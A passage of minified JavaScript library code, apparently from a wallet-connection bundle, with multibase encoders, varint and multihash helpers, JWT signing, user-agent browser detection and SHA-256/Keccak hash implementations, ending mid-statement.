cEe=Is({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),uEe=Is({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),lEe=Is({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),dEe=Is({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var fEe=Object.freeze({__proto__:null,base64:cEe,base64pad:uEe,base64url:lEe,base64urlpad:dEe});const vie=Array.from(""),hEe=vie.reduce((t,e,n)=>(t[n]=e,t),[]),pEe=vie.reduce((t,e,n)=>(t[e.codePointAt(0)]=n,t),[]);function mEe(t){return t.reduce((e,n)=>(e+=hEe[n],e),"")}function gEe(t){const e=[];for(const n of t){const r=pEe[n.codePointAt(0)];if(r===void 0)throw new Error(`Non-base256emoji character: ${n}`);e.push(r)}return new Uint8Array(e)}const yEe=zI({prefix:"",name:"base256emoji",encode:mEe,decode:gEe});var bEe=Object.freeze({__proto__:null,base256emoji:yEe}),wEe=Eie,ez=128,vEe=-128,EEe=Math.pow(2,31);function Eie(t,e,n){e=e||[],n=n||0;for(var r=n;t>=EEe;)e[n++]=t&255|ez,t/=128;for(;t&vEe;)e[n++]=t&255|ez,t>>>=7;return e[n]=t|0,Eie.bytes=n-r+1,e}var _Ee=Gk,AEe=128,tz=127;function Gk(t,r){var n=0,r=r||0,i=0,s=r,o,a=t.length;do{if(s>=a)throw Gk.bytes=0,new RangeError("Could not decode varint");o=t[s++],n+=i<28?(o&tz)<<i:(o&tz)*Math.pow(2,i),i+=7}while(o>=AEe);return Gk.bytes=s-r,n}var CEe=Math.pow(2,7),SEe=Math.pow(2,14),TEe=Math.pow(2,21),xEe=Math.pow(2,28),IEe=Math.pow(2,35),REe=Math.pow(2,42),PEe=Math.pow(2,49),NEe=Math.pow(2,56),OEe=Math.pow(2,63),kEe=function(t){return t<CEe?1:t<SEe?2:t<TEe?3:t<xEe?4:t<IEe?5:t<REe?6:t<PEe?7:t<NEe?8:t<OEe?9:10},DEe={encode:wEe,decode:_Ee,encodingLength:kEe},_ie=DEe;const nz=(t,e,n=0)=>(_ie.encode(t,e,n),e),rz=t=>_ie.encodingLength(t),Kk=(t,e)=>{const n=e.byteLength,r=rz(t),i=r+rz(n),s=new Uint8Array(i+n);return nz(t,s,0),nz(n,s,r),s.set(e,i),new BEe(t,n,e,s)};let BEe=class{constructor(e,n,r,i){this.code=e,this.size=n,this.digest=r,this.bytes=i}};const Aie=({name:t,code:e,encode:n})=>new jEe(t,e,n);let jEe=class{constructor(e,n,r){this.name=e,this.code=n,this.encode=r}digest(e){if(e instanceof Uint8Array){const n=this.encode(e);return n instanceof Uint8Array?Kk(this.code,n):n.then(r=>Kk(this.code,r))}else throw Error("Unknown type, must be binary type")}};const Cie=t=>async e=>new Uint8Array(await crypto.subtle.digest(t,e)),MEe=Aie({name:"sha2-256",code:18,encode:Cie("SHA-256")}),UEe=Aie({name:"sha2-512",code:19,encode:Cie("SHA-512")});var LEe=Object.freeze({__proto__:null,sha256:MEe,sha512:UEe});const Sie=0,FEe="identity",Tie=bie,$Ee=t=>Kk(Sie,Tie(t)),HEe={code:Sie,name:FEe,encode:Tie,digest:$Ee};var zEe=Object.freeze({__proto__:null,identity:HEe});new TextEncoder,new TextDecoder;const iz={...j2e,...U2e,...F2e,...H2e,...V2e,...tEe,...iEe,...aEe,...fEe,...bEe};({...LEe,...zEe});function xie(t,e,n,r){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:n},decoder:{decode:r}}}const sz=xie("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),YN=xie("ascii","a",t=>{let e="a";for(let n=0;n<t.length;n++)e+=String.fromCharCode(t[n]);return e},t=>{t=t.substring(1);const e=gie(t.length);for(let n=0;n<t.length;n++)e[n]=t.charCodeAt(n);return e}),Iie={utf8:sz,"utf-8":sz,hex:iz.base16,latin1:YN,ascii:YN,binary:YN,...iz};function qI(t,e="utf8"){const n=Iie[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t.buffer,t.byteOffset,t.byteLength).toString("utf8"):n.encoder.encode(t).substring(1)}function nw(t,e="utf8"){const n=Iie[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?hB(globalThis.Buffer.from(t,"utf-8")):n.decoder.decode(`${n.prefix}${t}`)}function oz(t){return sg(qI(nw(t,HI),pie))}function _x(t){return qI(nw(Rf(t),pie),HI)}function Rie(t){const e=nw(_2e,XH),n=E2e+qI(yie([e,t]),XH);return[w2e,v2e,n].join(b2e)}function qEe(t){return qI(t,HI)}function VEe(t){return nw(t,HI)}function WEe(t){return nw([_x(t.header),_x(t.payload)].join(Ex),mie)}function GEe(t){return[_x(t.header),_x(t.payload),qEe(t.signature)].join(Ex)}function Zk(t){const e=t.split(Ex),n=oz(e[0]),r=oz(e[1]),i=VEe(e[2]),s=nw(e.slice(0,2).join(Ex),mie);return{header:n,payload:r,signature:i,data:s}}function az(t=rie(A2e)){const e=hie.getPublicKey(t);return{secretKey:yie([t,e]),publicKey:e}}async function KEe(t,e,n,r,i=Ye.fromMiliseconds(Date.now())){const s={alg:g2e,typ:y2e},o=Rie(r.publicKey),a=i+n,c={iss:o,sub:t,aud:e,iat:i,exp:a},l=WEe({header:s,payload:c}),f=hie.sign(l,r.secretKey.slice(0,32));return GEe({header:s,payload:c,signature:f})}var cz=function(t,e,n){if(n||arguments.length===2)for(var r=0,i=e.length,s;r<i;r++)(s||!(r in e))&&(s||(s=Array.prototype.slice.call(e,0,r)),s[r]=e[r]);return t.concat(s||Array.prototype.slice.call(e))},ZEe=(function(){function t(e,n,r){this.name=e,this.version=n,this.os=r,this.type="browser"}return t})(),YEe=(function(){function t(e){this.version=e,this.type="node",this.name="node",this.os=process.platform}return t})(),QEe=(function(){function t(e,n,r,i){this.name=e,this.version=n,this.os=r,this.bot=i,this.type="bot-device"}return t})(),JEe=(function(){function t(){this.type="bot",this.bot=!0,this.name="bot",this.version=null,this.os=null}return t})(),XEe=(function(){function t(){this.type="react-native",this.name="react-native",this.version=null,this.os=null}return t})(),e_e=/alexa|bot|crawl(er|ing)|facebookexternalhit|feedburner|google web preview|nagios|postrank|pingdom|slurp|spider|yahoo!|yandex/,t_e=/(nuhk|curl|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask\ Jeeves\/Teoma|ia_archiver)/,uz=3,n_e=[["aol",/AOLShield\/([0-9\._]+)/],["edge",/Edge\/([0-9\._]+)/],["edge-ios",/EdgiOS\/([0-9\._]+)/],["yandexbrowser",/YaBrowser\/([0-9\._]+)/],["kakaotalk",/KAKAOTALK\s([0-9\.]+)/],["samsung",/SamsungBrowser\/([0-9\.]+)/],["silk",/\bSilk\/([0-9._-]+)\b/],["miui",/MiuiBrowser\/([0-9\.]+)$/],["beaker",/BeakerBrowser\/([0-9\.]+)/],["edge-chromium",/EdgA?\/([0-9\.]+)/],["chromium-webview",/(?!Chrom.*OPR)wv\).*Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["chrome",/(?!Chrom.*OPR)Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["phantomjs",/PhantomJS\/([0-9\.]+)(:?\s|$)/],["crios",/CriOS\/([0-9\.]+)(:?\s|$)/],["firefox",/Firefox\/([0-9\.]+)(?:\s|$)/],["fxios",/FxiOS\/([0-9\.]+)/],["opera-mini",/Opera Mini.*Version\/([0-9\.]+)/],["opera",/Opera\/([0-9\.]+)(?:\s|$)/],["opera",/OPR\/([0-9\.]+)(:?\s|$)/],["pie",/^Microsoft Pocket Internet Explorer\/(\d+\.\d+)$/],["pie",/^Mozilla\/\d\.\d+\s\(compatible;\s(?:MSP?IE|MSInternet Explorer) (\d+\.\d+);.*Windows CE.*\)$/],["netfront",/^Mozilla\/\d\.\d+.*NetFront\/(\d.\d)/],["ie",/Trident\/7\.0.*rv\:([0-9\.]+).*\).*Gecko$/],["ie",/MSIE\s([0-9\.]+);.*Trident\/[4-7].0/],["ie",/MSIE\s(7\.0)/],["bb10",/BB10;\sTouch.*Version\/([0-9\.]+)/],["android",/Android\s([0-9\.]+)/],["ios",/Version\/([0-9\._]+).*Mobile.*Safari.*/],["safari",/Version\/([0-9\._]+).*Safari/],["facebook",/FB[AS]V\/([0-9\.]+)/],["instagram",/Instagram\s([0-9\.]+)/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Mobile/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Gecko\)$/],["curl",/^curl\/([0-9\.]+)$/],["searchbot",e_e]],lz=[["iOS",/iP(hone|od|ad)/],["Android OS",/Android/],["BlackBerry OS",/BlackBerry|BB10/],["Windows Mobile",/IEMobile/],["Amazon OS",/Kindle/],["Windows 3.11",/Win16/],["Windows 95",/(Windows 95)|(Win95)|(Windows_95)/],["Windows 98",/(Windows 98)|(Win98)/],["Windows 2000",/(Windows NT 5.0)|(Windows 2000)/],["Windows XP",/(Windows NT 5.1)|(Windows XP)/],["Windows Server 2003",/(Windows NT 5.2)/],["Windows Vista",/(Windows NT 6.0)/],["Windows 7",/(Windows NT 6.1)/],["Windows 8",/(Windows NT 6.2)/],["Windows 8.1",/(Windows NT 6.3)/],["Windows 10",/(Windows NT 10.0)/],["Windows ME",/Windows ME/],["Windows CE",/Windows CE|WinCE|Microsoft Pocket Internet Explorer/],["Open BSD",/OpenBSD/],["Sun OS",/SunOS/],["Chrome OS",/CrOS/],["Linux",/(Linux)|(X11)/],["Mac OS",/(Mac_PowerPC)|(Macintosh)/],["QNX",/QNX/],["BeOS",/BeOS/],["OS/2",/OS\/2/]];function r_e(t){return typeof document>"u"&&typeof navigator<"u"&&navigator.product==="ReactNative"?new XEe:typeof navigator<"u"?s_e(navigator.userAgent):a_e()}function i_e(t){return t!==""&&n_e.reduce(function(e,n){var r=n[0],i=n[1];if(e)return e;var s=i.exec(t);return!!s&&[r,s]},!1)}function s_e(t){var e=i_e(t);if(!e)return null;var n=e[0],r=e[1];if(n==="searchbot")return new JEe;var i=r[1]&&r[1].split(".").join("_").split("_").slice(0,3);i?i.length<uz&&(i=cz(cz([],i,!0),c_e(uz-i.length),!0)):i=[];var s=i.join("."),o=o_e(t),a=t_e.exec(t);return a&&a[1]?new QEe(n,s,o,a[1]):new ZEe(n,s,o)}function o_e(t){for(var e=0,n=lz.length;e<n;e++){var r=lz[e],i=r[0],s=r[1],o=s.exec(t);if(o)return i}return null}function a_e(){var t=typeof process<"u"&&process.version;return t?new YEe(process.version.slice(1)):null}function c_e(t){for(var e=[],n=0;n<t;n++)e.push("0");return e}var lr={},dz;function Pie(){if(dz)return lr;dz=1,Object.defineProperty(lr,"__esModule",{value:!0}),lr.getLocalStorage=lr.getLocalStorageOrThrow=lr.getCrypto=lr.getCryptoOrThrow=lr.getLocation=lr.getLocationOrThrow=lr.getNavigator=lr.getNavigatorOrThrow=lr.getDocument=lr.getDocumentOrThrow=lr.getFromWindowOrThrow=lr.getFromWindow=void 0;function t(m){let b;return typeof window<"u"&&typeof window[m]<"u"&&(b=window[m]),b}lr.getFromWindow=t;function e(m){const b=t(m);if(!b)throw new Error(`${m} is not defined in Window`);return b}lr.getFromWindowOrThrow=e;function n(){return e("document")}lr.getDocumentOrThrow=n;function r(){return t("document")}lr.getDocument=r;function i(){return e("navigator")}lr.getNavigatorOrThrow=i;function s(){return t("navigator")}lr.getNavigator=s;function o(){return e("location")}lr.getLocationOrThrow=o;function a(){return t("location")}lr.getLocation=a;function c(){return e("crypto")}lr.getCryptoOrThrow=c;function l(){return t("crypto")}lr.getCrypto=l;function f(){return e("localStorage")}lr.getLocalStorageOrThrow=f;function h(){return t("localStorage")}return lr.getLocalStorage=h,lr}var Pf=Pie(),_v={},fz;function u_e(){if(fz)return _v;fz=1,Object.defineProperty(_v,"__esModule",{value:!0}),_v.getWindowMetadata=void 0;const t=Pie();function e(){let n,r;try{n=t.getDocumentOrThrow(),r=t.getLocationOrThrow()}catch{return null}function i(){const b=n.getElementsByTagName("link"),w=[];for(let y=0;y<b.length;y++){const E=b[y],A=E.getAttribute("rel");if(A&&A.toLowerCase().indexOf("icon")>-1){const R=E.getAttribute("href");if(R)if(R.toLowerCase().indexOf("https:")===-1&&R.toLowerCase().indexOf("http:")===-1&&R.indexOf("//")!==0){let S=r.protocol+"//"+r.host;if(R.indexOf("/")===0)S+=R;else{const v=r.pathname.split("/");v.pop();const k=v.join("/");S+=k+"/"+R}w.push(S)}else if(R.indexOf("//")===0){const S=r.protocol+R;w.push(S)}else w.push(R)}}return w}function s(...b){const w=n.getElementsByTagName("meta");for(let y=0;y<w.length;y++){const E=w[y],A=["itemprop","property","name"].map(R=>E.getAttribute(R)).filter(R=>R?b.includes(R):!1);if(A.length&&A){const R=E.getAttribute("content");if(R)return R}}return""}function o(){let b=s("name","og:site_name","og:title","twitter:title");return b||(b=n.title),b}function a(){return s("description","og:description","twitter:description","keywords")}const c=o(),l=a(),f=r.origin,h=i();return{description:l,url:f,icons:h,name:c}}return _v.getWindowMetadata=e,_v}var l_e=u_e();const d_e="0.1.1";function f_e(){return d_e}class Fr extends Error{constructor(e,n={}){const r=(()=>{if(n.cause instanceof Fr){if(n.cause.details)return n.cause.details;if(n.cause.shortMessage)return n.cause.shortMessage}return n.cause&&"details"in n.cause&&typeof n.cause.details=="string"?n.cause.details:n.cause?.message?n.cause.message:n.details})(),i=n.cause instanceof Fr&&n.cause.docsPath||n.docsPath,o=`https://oxlib.sh${i??""}`,a=[e||"An error occurred.",...n.metaMessages?["",...n.metaMessages]:[],...r||i?["",r?`Details: ${r}`:void 0,i?`See: ${o}`:void 0]:[]].filter(c=>typeof c=="string").join(`
`);super(a,n.cause?{cause:n.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docs",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:`ox@${f_e()}`}),this.cause=n.cause,this.details=r,this.docs=o,this.docsPath=i,this.shortMessage=e}walk(e){return Nie(this,e)}}function Nie(t,e){return e?.(t)?t:t&&typeof t=="object"&&"cause"in t&&t.cause?Nie(t.cause,e):e?null:t}const rb=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;function h_e(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function s_(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function og(t,...e){if(!h_e(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function p_e(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.createHasher");s_(t.outputLen),s_(t.blockLen)}function A1(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function Oie(t,e){og(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}function m_e(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function C1(...t){for(let e=0;e<t.length;e++)t[e].fill(0)}function QN(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function wl(t,e){return t<<32-e|t>>>e}const g_e=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function y_e(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}function b_e(t){for(let e=0;e<t.length;e++)t[e]=y_e(t[e]);return t}const hz=g_e?t=>t:b_e;function w_e(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}function VI(t){return typeof t=="string"&&(t=w_e(t)),og(t),t}function v_e(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];og(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const s=t[r];n.set(s,i),i+=s.length}return n}let pB=class{};function kie(t){const e=r=>t().update(VI(r)).digest(),n=t();return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=()=>t(),e}function E_e(t=32){if(rb&&typeof rb.getRandomValues=="function")return rb.getRandomValues(new Uint8Array(t));if(rb&&typeof rb.randomBytes=="function")return Uint8Array.from(rb.randomBytes(t));throw new Error("crypto.getRandomValues must be defined")}function __e(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),s=BigInt(4294967295),o=Number(n>>i&s),a=Number(n&s),c=r?4:0,l=r?0:4;t.setUint32(e+c,o,r),t.setUint32(e+l,a,r)}function A_e(t,e,n){return t&e^~t&n}function C_e(t,e,n){return t&e^t&n^e&n}class S_e extends pB{constructor(e,n,r,i){super(),this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.blockLen=e,this.outputLen=n,this.padOffset=r,this.isLE=i,this.buffer=new Uint8Array(e),this.view=QN(this.buffer)}update(e){A1(this),e=VI(e),og(e);const{view:n,buffer:r,blockLen:i}=this,s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=QN(e);for(;i<=s-o;o+=i)this.process(c,o);continue}r.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(n,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){A1(this),Oie(e,this),this.finished=!0;const{buffer:n,view:r,blockLen:i,isLE:s}=this;let{pos:o}=this;n[o++]=128,C1(this.buffer.subarray(o)),this.padOffset>i-o&&(this.process(r,0),o=0);for(let h=o;h<i;h++)n[h]=0;__e(r,i-8,BigInt(this.length*8),s),this.process(r,0);const a=QN(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,f=this.get();if(l>f.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<l;h++)a.setUint32(4*h,f[h],s)}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:n,buffer:r,length:i,finished:s,destroyed:o,pos:a}=this;return e.destroyed=o,e.finished=s,e.length=i,e.pos=a,i%n&&e.buffer.set(r),e}clone(){return this._cloneInto()}}const Fh=Uint32Array.from([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),L3=BigInt(2**32-1),pz=BigInt(32);function T_e(t,e=!1){return e?{h:Number(t&L3),l:Number(t>>pz&L3)}:{h:Number(t>>pz&L3)|0,l:Number(t&L3)|0}}function x_e(t,e=!1){const n=t.length;let r=new Uint32Array(n),i=new Uint32Array(n);for(let s=0;s<n;s++){const{h:o,l:a}=T_e(t[s],e);[r[s],i[s]]=[o,a]}return[r,i]}const I_e=(t,e,n)=>t<<n|e>>>32-n,R_e=(t,e,n)=>e<<n|t>>>32-n,P_e=(t,e,n)=>e<<n-32|t>>>64-n,N_e=(t,e,n)=>t<<n-32|e>>>64-n,O_e=BigInt(0),Av=BigInt(1),k_e=BigInt(2),D_e=BigInt(7),B_e=BigInt(256),j_e=BigInt(113),Die=[],Bie=[],jie=[];for(let t=0,e=Av,n=1,r=0;t<24;t++){[n,r]=[r,(2*n+3*r)%5],Die.push(2*(5*r+n)),Bie.push((t+1)*(t+2)/2%64);let i=O_e;for(let s=0;s<7;s++)e=(e<<Av^(e>>D_e)*j_e)%B_e,e&k_e&&(i^=Av<<(Av<<BigInt(s))-Av);jie.push(i)}const Mie=x_e(jie,!0),M_e=Mie[0],U_e=Mie[1],mz=(t,e,n)=>n>32?P_e(t,e,n):I_e(t,e,n),gz=(t,e,n)=>n>32?N_e(t,e,n):R_e(t,e,n);function L_e(t,e=24){const n=new Uint32Array(10);for(let r=24-e;r<24;r++){for(let o=0;o<10;o++)n[o]=t[o]^t[o+10]^t[o+20]^t[o+30]^t[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=n[c],f=n[c+1],h=mz(l,f,1)^n[a],m=gz(l,f,1)^n[a+1];for(let b=0;b<50;b+=10)t[o+b]^=h,t[o+b+1]^=m}let i=t[2],s=t[3];for(let o=0;o<24;o++){const a=Bie[o],c=mz(i,s,a),l=gz(i,s,a),f=Die[o];i=t[f],s=t[f+1],t[f]=c,t[f+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)n[a]=t[o+a];for(let a=0;a<10;a++)t[o+a]^=~n[(a+2)%10]&n[(a+4)%10]}t[0]^=M_e[r],t[1]^=U_e[r]}C1(n)}let F_e=class Uie extends pB{constructor(e,n,r,i=!1,s=24){if(super(),this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,this.enableXOF=!1,this.blockLen=e,this.suffix=n,this.outputLen=r,this.enableXOF=i,this.rounds=s,s_(r),!(0<e&&e<200))throw new Error("only keccak-f1600 function is supported");this.state=new Uint8Array(200),this.state32=m_e(this.state)}clone(){return this._cloneInto()}keccak(){hz(this.state32),L_e(this.state32,this.rounds),hz(this.state32),this.posOut=0,this.pos=0}update(e){A1(this),e=VI(e),og(e);const{blockLen:n,state:r}=this,i=e.length;for(let s=0;s<i;){const o=Math.min(n-this.pos,i-s);for(let a=0;a<o;a++)r[this.pos++]^=e[s++];this.pos===n&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:n,pos:r,blockLen:i}=this;e[r]^=n,(n&128)!==0&&r===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){A1(this,!1),og(e),this.finish();const n=this.state,{blockLen:r}=this;for(let i=0,s=e.length;i<s;){this.posOut>=r&&this.keccak();const o=Math.min(r-this.posOut,s-i);e.set(n.subarray(this.posOut,this.posOut+o),i),this.posOut+=o,i+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return s_(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(Oie(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,C1(this.state)}_cloneInto(e){const{blockLen:n,suffix:r,outputLen:i,rounds:s,enableXOF:o}=this;return e||(e=new Uie(n,r,i,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=r,e.outputLen=i,e.enableXOF=o,e.destroyed=this.destroyed,e}};const $_e=(t,e,n)=>kie(()=>new F_e(e,t,n)),H_e=$_e(1,136,256/8),z_e=Uint32Array.from([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),$h=new Uint32Array(64);let q_e=class extends S_e{constructor(e=32){super(64,e,8,!1),this.A=Fh[0]|0,this.B=Fh[1]|0,this.C=Fh[2]|0,this.D=Fh[3]|0,this.E=Fh[4]|0,this.F=Fh[5]|0,this.G=Fh[6]|0,this.H=Fh[7]|0}get(){const{A:e,B:n,C:r,D:i,E:s,F:o,G:a,H:c}=this;return[e,n,r,i,s,o,a,c]}set(e,n,r,i,s,o,a,c){this.A=e|0,this.B=n|0,this.C=r|0,this.D=i|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,n){for(let h=0;h<16;h++,n+=4)$h[h]=e.getUint32(n,!1);for(let h=16;h<64;h++){const m=$h[h-15],b=$h[h-2],w=wl(m,7)^wl(m,18)^m>>>3,y=wl(b,17)^wl(b,19)^b>>>10;$h[h]=y+$h[h-7]+w+$h[h-16]|0}let{A:r,B:i,C:s,D:o,E:a,F:c,G:l,H:f}=this;for(let h=0;h<64;h++){const m=wl(a,6)^wl(a,11)^wl(a,25),b=f+m+A_e(a,c,l)+z_e[h]+$h[h]|0,y=(wl(r,2)^wl(r,13)^wl(r,22))+C_e(r,i,s)|0;f=l,l=c,c=a,a=o+b|0,o=s,s=i,i=r,r=b+y|0}r=r+this.A|0,i=i+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,l=l+this.G|0,f=f+this.H|0,this.set(r,i,s,o,a,c,l,f)}roundClean(){C1($h)}destroy(){this.set(0,0,0,0,0,0,0,0),C1(this.buffer)}};const V_e=kie(()=>new q_e);const mB=BigInt(0),Yk=BigInt(1);function Y_(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function gB(t){if(!Y_(t))throw new Error("Uint8Array expected")}function o_(t,e){if(typeof e!="boolean")throw new Error(t+" boolean expected, got "+e)}function F3(t){const e=t.toString(16);return e.length&1?"0"+e:e}function Lie(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?mB:BigInt("0x"+t)}const Fie=typeof Uint8Array.from([]).toHex=="function"&&typeof Uint8Array.fromHex=="function",W_e=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function a_(t){if(gB(t),Fie)return t.toHex();let e="";for(let n=0;n<t.length;n++)e+=W_e[t[n]];return e}const Bd={_0:48,_9:57,A:65,F:70,a:97,f:102};function yz(t){if(t>=Bd._0&&t<=Bd._9)return t-Bd._0;if(t>=Bd.A&&t<=Bd.F)return t-(Bd.A-10);if(t>=Bd.a&&t<=Bd.f)return t-(Bd.a-10)}function Ax(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);if(Fie)return Uint8Array.fromHex(t);const e=t.length,n=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const r=new Uint8Array(n);for(let i=0,s=0;i<n;i++,s+=2){const o=yz(t.charCodeAt(s)),a=yz(t.charCodeAt(s+1));if(o===void 0||a===void 0){const c=t[s]+t[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}r[i]=o*16+a}return r}function Ym(t){return Lie(a_(t))}function $ie(t){return gB(t),Lie(a_(Uint8Array.from(t).reverse()))}function Q_(t,e){return Ax(t.toString(16).padStart(e*2,"0"))}function Hie(t,e){return Q_(t,e).reverse()}function Rc(t,e,n){let r;if(typeof e=="string")try{r=Ax(e)}catch(s){throw new Error(t+" must be hex string or Uint8Array, cause: "+s)}else if(Y_(e))r=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=r.length;if(typeof n=="number"&&i!==n)throw new Error(t+" of length "+n+" expected, got "+i);return r}function Cx(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];gB(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const s=t[r];n.set(s,i),i+=s.length}return n}const JN=t=>typeof t=="bigint"&&mB<=t;function yB(t,e,n){return JN(t)&&JN(e)&&JN(n)&&e<=t&&t<n}function Xb(t,e,n,r){if(!yB(e,n,r))throw new Error("expected valid "+t+": "+n+" <= n < "+r+", got "+e)}function G_e(t){let e;for(e=0;t>mB;t>>=Yk,e+=1);return e}const WI=t=>(Yk<<BigInt(t))-Yk,XN=t=>new Uint8Array(t),bz=t=>Uint8Array.from(t);function K_e(t,e,n){if(typeof t!="number"||t<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof n!="function")throw new Error("hmacFn must be a function");let r=XN(t),i=XN(t),s=0;const o=()=>{r.fill(1),i.fill(0),s=0},a=(...h)=>n(i,r,...h),c=(h=XN(0))=>{i=a(bz([0]),h),r=a(),h.length!==0&&(i=a(bz([1]),h),r=a())},l=()=>{if(s++>=1e3)throw new Error("drbg: tried 1000 values");let h=0;const m=[];for(;h<e;){r=a();const b=r.slice();m.push(b),h+=r.length}return Cx(...m)};return(h,m)=>{o(),c(h);let b;for(;!(b=m(l()));)c();return o(),b}}const Z_e={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||Y_(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function GI(t,e,n={}){const r=(i,s,o)=>{const a=Z_e[s];if(typeof a!="function")throw new Error("invalid validator function");const c=t[i];if(!(o&&c===void 0)&&!a(c,t))throw new Error("param "+String(i)+" is invalid. Expected "+s+", got 